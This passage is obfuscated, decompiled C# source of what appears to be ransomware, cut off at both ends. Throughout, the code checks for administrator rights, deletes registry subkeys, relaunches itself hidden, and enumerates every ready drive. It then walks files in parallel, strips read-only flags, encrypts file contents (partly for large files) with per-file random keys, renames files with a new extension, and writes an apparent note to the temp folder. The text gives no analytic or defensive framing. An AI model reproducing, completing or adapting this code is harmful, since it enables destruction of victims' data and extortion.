		}
	}

	public static string BAMribwsEQVLXJ(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void vNdHenxhIcZi()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = zikllNgvJXLR(getString_0(107391525));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HIZwQscayZMa(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107391387)));
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107391362)));
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107390801)));
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107390776)));
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107391559)));
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107390783)));
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107390754)));
					registryKey.Close();
				}
				string_ = zikllNgvJXLR(getString_0(107390705));
				registryKey = Registry.LocalMachine.OpenSubKey(HIZwQscayZMa(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107390608)));
					registryKey.Close();
				}
				string_ = zikllNgvJXLR(getString_0(107390623));
				registryKey = Registry.LocalMachine.OpenSubKey(HIZwQscayZMa(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107390608)));
					registryKey.Close();
				}
				string_ = zikllNgvJXLR(getString_0(107390623));
				registryKey = Registry.CurrentUser.OpenSubKey(HIZwQscayZMa(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HIZwQscayZMa(getString_0(107390608)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			QYoxJyabcEN(HIZwQscayZMa(getString_0(107390574)), HIZwQscayZMa(getString_0(107390589)));
			QYoxJyabcEN(HIZwQscayZMa(getString_0(107391020)), HIZwQscayZMa(getString_0(107391043)));
			QYoxJyabcEN(HIZwQscayZMa(getString_0(107391020)), HIZwQscayZMa(getString_0(107390865)));
			QYoxJyabcEN(HIZwQscayZMa(getString_0(107390292)), HIZwQscayZMa(getString_0(107390307)));
		}
		catch
		{
		}
	}

	public static void SfCyHUXuiKgwteW(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(HIZwQscayZMa(getString_0(107390234)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void pREEHmuZBxDt()
	{
		QYoxJyabcEN(getString_0(107397154), HIZwQscayZMa(getString_0(107390209)));
		string text = HIZwQscayZMa(getString_0(107390527));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391582) + text + getString_0(107391582) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397154);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void VsyCflqkTNfpfbv(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (diLbjzXQsjUvfr)
			{
				try
				{
					File.AppendAllText(fNCnNJWJkI, getString_0(107390462) + string_0 + getString_0(107390421) + ex.Message + getString_0(107396610));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string bmwWGsqcQrk()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393932);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390364);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390355))) ? getString_0(107390369) : getString_0(107390346));
				break;
			case 0:
				text = getString_0(107390360);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390327);
				break;
			case 4:
				text = getString_0(107390314);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389784) : getString_0(107390337));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389792) : getString_0(107389797)) : getString_0(107389770)) : getString_0(107389779));
				break;
			case 10:
				text = getString_0(107389787);
				break;
			}
		}
		if (text != getString_0(107393932))
		{
			text = getString_0(107389750) + text;
			if (oSVersion.ServicePack != getString_0(107393932))
			{
				text = text + getString_0(107393046) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string cMxOggYqQlwq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395224);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(HIZwQscayZMa(getString_0(107395191)));
				streamWriter.WriteLine(getString_0(107396610));
				streamWriter.WriteLine(HIZwQscayZMa(getString_0(107393885)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107393743) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (diLbjzXQsjUvfr)
			{
				try
				{
					File.AppendAllText(fNCnNJWJkI, getString_0(107389737) + ex.Message + getString_0(107396610));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void OAnvVvkVTnJg(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		tUlAjfzdpI.ndRcxMNfrj CS_0024_003C_003E8__locals0 = new tUlAjfzdpI();
		CS_0024_003C_003E8__locals0.PrOFcmBNSPzcP = string_1;
		CS_0024_003C_003E8__locals0.kljgkOdjshZ = string_2;
		CS_0024_003C_003E8__locals0.xOpnYbSISAB = string_3;
		CS_0024_003C_003E8__locals0.vepxGtypYG = string_4;
		LvwthqCIfyprjsma = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.xOpnYbSISAB);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395851))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !ndBzFjvUeNH.Contains(array[i].Name))
					{
						ndBzFjvUeNH.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!ndBzFjvUeNH.Contains(string_0[j]))
				{
					ndBzFjvUeNH.Add(string_0[j]);
				}
			}
		}
		if (ndBzFjvUeNH.Contains(HIZwQscayZMa(getString_0(107389680))) && ZsLqPlmZKQuFKP == getString_0(107396725))
		{
			ndBzFjvUeNH.Remove(HIZwQscayZMa(getString_0(107389680)));
		}
		Parallel.ForEach(ndBzFjvUeNH, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new tUlAjfzdpI.ndRcxMNfrj();
			CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.pRdVQkJUcNR = string_0;
			if (HPWnUWTgHq && !bmwWGsqcQrk().Contains(tUlAjfzdpI.getString_0(107389793)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						xkiuAMfGtUFTFcM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.pRdVQkJUcNR);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ysmQyIRLiTDhstt == tUlAjfzdpI.getString_0(107396734))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					lsPYSsVKcw(CS_0024_003C_003E8__locals0.pRdVQkJUcNR, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.PrOFcmBNSPzcP, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.vepxGtypYG, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.kljgkOdjshZ, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.xOpnYbSISAB);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				lsPYSsVKcw(CS_0024_003C_003E8__locals0.pRdVQkJUcNR, CS_0024_003C_003E8__locals0.PrOFcmBNSPzcP, CS_0024_003C_003E8__locals0.vepxGtypYG, CS_0024_003C_003E8__locals0.kljgkOdjshZ, CS_0024_003C_003E8__locals0.xOpnYbSISAB);
			}
		});
	}

	public static void lsPYSsVKcw(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393932));
		List<string> list3 = list2;
		if (hwISOErmmXW == getString_0(107396694))
		{
			list = ukFVFMOKSQjZ(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = YregMXoeJCC.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((HrqrtPhWTAbK == getString_0(107396694) && !item.EndsWith(text)) || eVEJPETDEKd.Contains(item))
				{
					continue;
				}
				if (FvCkrJmFGmOziw == getString_0(107396725))
				{
					try
					{
						if (fdtKAmGWXfi.WHvMByXpIWTxQu(item))
						{
							fdtKAmGWXfi.YtQDdeRlSBPmR(item);
						}
					}
					catch
					{
					}
				}
				eVEJPETDEKd.Add(item);
				if (!fxkaTZNzSZr.Contains(Path.GetDirectoryName(item)))
				{
					fxkaTZNzSZr.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (gdOttXkAiCtHt == getString_0(107396725) && fileStream.Length > Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024 && !list3.Contains(text))
					{
						if (DzWFTAUXUsJj == getString_0(107396725))
						{
							foreach (string item2 in ewhHGOPmfx)
							{
								if (item.ToLower().EndsWith(item2) && hyJckWvZQWcw == getString_0(107396725))
								{
									if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && hyJckWvZQWcw == getString_0(107396694))
								{
									try
									{
										ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = rFWQHdvUec.aCOAFhOcJacI(item, Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024);
						byte[] cNlFBFakfbYZRJ = rFWQHdvUec.ItXpiZDVtRONv(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						rFWQHdvUec.xYtDCXnCoWLDY(item, cNlFBFakfbYZRJ);
						if (string_2 != getString_0(107389703))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389703))
					{
						XXYCcfYUZoisqm(item, item + string_2, LvwthqCIfyprjsma);
					}
					else
					{
						XXYCcfYUZoisqm(item, item + getString_0(107389698), LvwthqCIfyprjsma);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void GUcDroqQwLUuMd(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		ucFASnlDtvNA.SODYbbdWBTfFH CS_0024_003C_003E8__locals0 = new ucFASnlDtvNA();
		CS_0024_003C_003E8__locals0.lnuYdimQEFE = list_0;
		CS_0024_003C_003E8__locals0.gHhZvtvHCcOv = string_1;
		CS_0024_003C_003E8__locals0.iiIQpsdvhyz = string_2;
		CS_0024_003C_003E8__locals0.hUytBMdeRsO = string_3;
		CS_0024_003C_003E8__locals0.FYyQrIlUOPc = new List<string> { getString_0(107393932) };
		if (HrqrtPhWTAbK == getString_0(107396694))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.lnuYdimQEFE)
				{
					if (CS_0024_003C_003E8__locals0.iiIQpsdvhyz.Length != 0)
					{
						string[] iiIQpsdvhyz2 = CS_0024_003C_003E8__locals0.iiIQpsdvhyz;
						int num2 = 0;
						while (num2 < iiIQpsdvhyz2.Length)
						{
							string value2 = iiIQpsdvhyz2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.gHhZvtvHCcOv))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (item.EndsWith(string_0) && !eVEJPETDEKd.Contains(item))
					{
						if (FvCkrJmFGmOziw == ucFASnlDtvNA.getString_0(107396742))
						{
							try
							{
								if (fdtKAmGWXfi.WHvMByXpIWTxQu(item))
								{
									fdtKAmGWXfi.YtQDdeRlSBPmR(item);
								}
							}
							catch
							{
							}
						}
						eVEJPETDEKd.Add(item);
						if (!fxkaTZNzSZr.Contains(Path.GetDirectoryName(item)))
						{
							fxkaTZNzSZr.Add(Path.GetDirectoryName(item));
						}
						VsyCflqkTNfpfbv(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (diLbjzXQsjUvfr)
								{
									try
									{
										File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + item + ucFASnlDtvNA.getString_0(107407165) + ex12.Message + ucFASnlDtvNA.getString_0(107396627));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (gdOttXkAiCtHt == ucFASnlDtvNA.getString_0(107396742) && new FileInfo(item).Length > Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.FYyQrIlUOPc.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new ucFASnlDtvNA.cNukjGDgTCkDrLH();
								CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
									{
										File.Move(item, item + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv);
									}
								}
								catch (Exception ex14)
								{
									if (!diLbjzXQsjUvfr)
									{
										break;
									}
									try
									{
										File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + item + ucFASnlDtvNA.getString_0(107407104) + ex14.Message + ucFASnlDtvNA.getString_0(107396627));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.kWfUVvyPiIV = ucFASnlDtvNA.getString_0(107393949);
								if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
								{
									CS_0024_003C_003E8__locals0.kWfUVvyPiIV = item + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv;
								}
								else
								{
									CS_0024_003C_003E8__locals0.kWfUVvyPiIV = item;
								}
								if (DzWFTAUXUsJj == ucFASnlDtvNA.getString_0(107396742))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in ewhHGOPmfx)
										{
											if (CS_0024_003C_003E8__locals0.kWfUVvyPiIV.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie.gHhZvtvHCcOv) && hyJckWvZQWcw == ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107396745))
											{
												if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.kWfUVvyPiIV).Length)
												{
													try
													{
														ceWGkLeWGlSf.juUjjlmBvTArjN(ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107394065), ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107394028), ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107394015), CS_0024_003C_003E8__locals0.kWfUVvyPiIV);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.kWfUVvyPiIV.ToLower().EndsWith(item2) && hyJckWvZQWcw == ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107396714))
											{
												try
												{
													ceWGkLeWGlSf.juUjjlmBvTArjN(ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107394065), ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107394028), ucFASnlDtvNA.cNukjGDgTCkDrLH.getString_0(107394015), CS_0024_003C_003E8__locals0.kWfUVvyPiIV);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = hATaEjuoJnfVW.woabxWiCwZgG(32);
								string s3 = ByLCmnnhrrppt.KwlFsMMThHblH(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = rFWQHdvUec.aCOAFhOcJacI(CS_0024_003C_003E8__locals0.kWfUVvyPiIV, Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024);
								rFWQHdvUec.xYtDCXnCoWLDY(cNlFBFakfbYZRJ: (!HzPgxRaUZqk) ? (DUcsRxUyUOuZr ? rFWQHdvUec.ItXpiZDVtRONv(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rFWQHdvUec.ItXpiZDVtRONv(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DUcsRxUyUOuZr ? dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IueAOiADdpUiTH: CS_0024_003C_003E8__locals0.kWfUVvyPiIV, KWheOAkoqEJXf: bytes3);
							}
							else
							{
								string text4 = hATaEjuoJnfVW.woabxWiCwZgG(32);
								string s4 = ByLCmnnhrrppt.KwlFsMMThHblH(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
								{
									if (!StzmabfzgZhvrc)
									{
										if (!DUcsRxUyUOuZr)
										{
											lsRSnbfdzmPAmx(item, item + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, LvwthqCIfyprjsma);
										}
										else
										{
											lsRSnbfdzmPAmx(item, item + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!DUcsRxUyUOuZr)
											{
												XEtwPwqcBXn(item, item + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, LvwthqCIfyprjsma);
											}
											else
											{
												XEtwPwqcBXn(item, item + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (diLbjzXQsjUvfr)
											{
												try
												{
													File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + item + ucFASnlDtvNA.getString_0(107389706) + ex16.Message + ucFASnlDtvNA.getString_0(107396627));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!StzmabfzgZhvrc)
								{
									if (!DUcsRxUyUOuZr)
									{
										lsRSnbfdzmPAmx(item, item + ucFASnlDtvNA.getString_0(107389715), LvwthqCIfyprjsma);
									}
									else
									{
										lsRSnbfdzmPAmx(item, item + ucFASnlDtvNA.getString_0(107389715), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!DUcsRxUyUOuZr)
										{
											XEtwPwqcBXn(item, item, LvwthqCIfyprjsma);
										}
										else
										{
											XEtwPwqcBXn(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (diLbjzXQsjUvfr)
										{
											try
											{
												File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + item + ucFASnlDtvNA.getString_0(107389706) + ex18.Message + ucFASnlDtvNA.getString_0(107396627));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (DUcsRxUyUOuZr)
								{
									if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
									{
										SfCyHUXuiKgwteW(item + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, bytes4);
									}
									else
									{
										SfCyHUXuiKgwteW(item, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.lnuYdimQEFE.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.lnuYdimQEFE, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new ucFASnlDtvNA.SODYbbdWBTfFH();
			CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hAWPAYCtjM = string_0;
			if (CS_0024_003C_003E8__locals0.iiIQpsdvhyz.Length != 0)
			{
				string[] iiIQpsdvhyz = CS_0024_003C_003E8__locals0.iiIQpsdvhyz;
				int num = 0;
				while (num < iiIQpsdvhyz.Length)
				{
					string value = iiIQpsdvhyz[num];
					if (!CS_0024_003C_003E8__locals0.hAWPAYCtjM.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.hAWPAYCtjM.EndsWith(CS_0024_003C_003E8__locals0.gHhZvtvHCcOv))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!eVEJPETDEKd.Contains(CS_0024_003C_003E8__locals0.hAWPAYCtjM))
			{
				if (FvCkrJmFGmOziw == ucFASnlDtvNA.getString_0(107396742))
				{
					try
					{
						if (fdtKAmGWXfi.WHvMByXpIWTxQu(CS_0024_003C_003E8__locals0.hAWPAYCtjM))
						{
							fdtKAmGWXfi.YtQDdeRlSBPmR(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
						}
					}
					catch
					{
					}
				}
				eVEJPETDEKd.Add(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
				if (!fxkaTZNzSZr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hAWPAYCtjM)))
				{
					fxkaTZNzSZr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hAWPAYCtjM));
				}
				VsyCflqkTNfpfbv(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.hAWPAYCtjM).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (diLbjzXQsjUvfr)
						{
							try
							{
								File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + ucFASnlDtvNA.getString_0(107407165) + ex2.Message + ucFASnlDtvNA.getString_0(107396627));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (gdOttXkAiCtHt == ucFASnlDtvNA.getString_0(107396742) && new FileInfo(CS_0024_003C_003E8__locals0.hAWPAYCtjM).Length > Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
							{
								File.Move(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv);
							}
						}
						catch (Exception ex4)
						{
							if (diLbjzXQsjUvfr)
							{
								try
								{
									File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + ucFASnlDtvNA.getString_0(107407104) + ex4.Message + ucFASnlDtvNA.getString_0(107396627));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
						{
							CS_0024_003C_003E8__locals0.hAWPAYCtjM += CS_0024_003C_003E8__locals0.gHhZvtvHCcOv;
						}
						if (DzWFTAUXUsJj == ucFASnlDtvNA.getString_0(107396742))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in ewhHGOPmfx)
								{
									if (CS_0024_003C_003E8__locals0.hAWPAYCtjM.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie.gHhZvtvHCcOv) && hyJckWvZQWcw == ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107396748))
									{
										if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hAWPAYCtjM).Length)
										{
											try
											{
												ceWGkLeWGlSf.juUjjlmBvTArjN(ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107394068), ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107394031), ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107394018), CS_0024_003C_003E8__locals0.hAWPAYCtjM);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.hAWPAYCtjM.ToLower().EndsWith(item3) && hyJckWvZQWcw == ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107396717))
									{
										try
										{
											ceWGkLeWGlSf.juUjjlmBvTArjN(ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107394068), ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107394031), ucFASnlDtvNA.SODYbbdWBTfFH.getString_0(107394018), CS_0024_003C_003E8__locals0.hAWPAYCtjM);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = hATaEjuoJnfVW.woabxWiCwZgG(32);
						string s = ByLCmnnhrrppt.KwlFsMMThHblH(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = rFWQHdvUec.aCOAFhOcJacI(CS_0024_003C_003E8__locals0.hAWPAYCtjM, Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024);
						rFWQHdvUec.xYtDCXnCoWLDY(cNlFBFakfbYZRJ: (!HzPgxRaUZqk) ? (DUcsRxUyUOuZr ? rFWQHdvUec.ItXpiZDVtRONv(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rFWQHdvUec.ItXpiZDVtRONv(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DUcsRxUyUOuZr ? dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IueAOiADdpUiTH: CS_0024_003C_003E8__locals0.hAWPAYCtjM, KWheOAkoqEJXf: bytes);
					}
					else
					{
						string text2 = hATaEjuoJnfVW.woabxWiCwZgG(32);
						string s2 = ByLCmnnhrrppt.KwlFsMMThHblH(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
						{
							if (!StzmabfzgZhvrc)
							{
								if (!DUcsRxUyUOuZr)
								{
									lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, LvwthqCIfyprjsma);
								}
								else
								{
